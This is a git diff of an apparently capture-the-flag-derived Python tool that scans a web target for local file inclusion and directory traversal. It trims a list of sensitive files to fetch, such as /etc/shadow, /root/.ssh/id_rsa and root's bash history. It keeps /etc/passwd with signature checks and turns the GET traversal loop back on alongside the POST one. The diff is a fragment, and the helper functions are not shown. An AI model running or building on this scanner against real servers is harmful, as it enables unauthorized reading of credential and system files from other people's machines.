@@ -7,15 +7,7 @@
 import argparse
 import requests
 
-
-# Common files to search for:
-# common_files=['/etc/issue', '/etc/profile', '/proc/version', '/etc/passwd', '/etc/shadow', \
-#                 'root/.bash_history', '/var/log/dmessage', '/var/mail/root', '/root/.ssh/id_rsa', \
-#                 '/var/log/apache2/access.log', 'C:\boot.ini']
 common_files=[ {
-        "name": "/etc/flag3",
-        "checks": ["st_"],
-    },{
         "name": "/etc/passwd",
         "checks": ["root:x","/bin/bash"],
     },{
@@ -129,9 +121,9 @@ def check_all_files_post(lfi):
 # LET'S GO! 
 url=clean_url(url)
 for f in common_files:
-    # answer = dir_trav(url,f)
-    # if answer != "I got nothing":
-    #     check_all_files(answer)
+    answer = dir_trav(url,f)
+    if answer != "I got nothing":
+        check_all_files(answer)
     post_answer = dir_post(url,f)
     if post_answer != "I got nothing":
         check_all_files_post(post_answer)
